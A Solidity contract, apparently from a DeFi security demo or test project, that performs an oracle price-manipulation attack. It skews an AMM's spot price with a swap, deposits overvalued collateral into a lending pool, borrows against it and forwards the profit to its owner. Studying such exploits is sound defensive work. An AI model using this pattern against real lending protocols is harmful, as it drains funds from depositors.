// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../contracts/Token.sol";
import "../contracts/AMM.sol";
import "../contracts/LendingPool.sol";

/// @notice Attacker manipulates AMM price with B->A swap, then borrows cheap B
contract OracleAttacker {
    ERC20Mintable public immutable tokenA;
    ERC20Mintable public immutable tokenB;
    SimpleAMM public immutable amm;
    LendingPool public immutable pool;
    address public owner;

    constructor(ERC20Mintable _a, ERC20Mintable _b, SimpleAMM _amm, LendingPool _pool) {
        tokenA = _a;
        tokenB = _b;
        amm = _amm;
        pool = _pool;
        owner = msg.sender;
    }

    function execute(uint256 amountBToManipulate, uint256 amountADeposit, uint256 amountBBorrow) external {
        require(msg.sender == owner, "not owner");

        // 1) Manipulate price: push A price high (swap B -> A)
        tokenB.approve(address(amm), type(uint256).max);
        amm.swapBForA(amountBToManipulate);

        // 2) Deposit a small amount of A as collateral (now overpriced)
        tokenA.approve(address(pool), type(uint256).max);
        pool.depositCollateral(amountADeposit);

        // 3) Borrow B against manipulated spot price
        pool.borrow(amountBBorrow);

        // profit in B -> forward to owner
        tokenB.transfer(owner, tokenB.balanceOf(address(this)));
    }
}
